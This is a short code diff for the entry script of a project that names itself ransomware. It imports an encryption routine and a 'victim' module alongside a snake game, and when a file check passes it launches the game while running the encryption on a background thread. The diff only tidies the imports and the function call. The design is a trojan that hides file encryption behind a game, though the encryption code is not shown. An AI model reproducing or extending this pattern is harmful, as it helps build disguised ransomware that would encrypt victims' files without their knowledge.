@@ -1,10 +1,10 @@
-from ransomware.mycrypto import Mycrypto,runEncryption
+from ransomware.mycrypto import runEncryption,CreateFile,checkfile
 from ransomware import victim
 from game import snake
 import threading
 
 if __name__ == "__main__":
-    fileCode = Mycrypto.checkfile()
+    fileCode = checkfile()
     if(fileCode == 0):
         print("open game and run encrypto")
         threading.Thread(target=runEncryption).start()
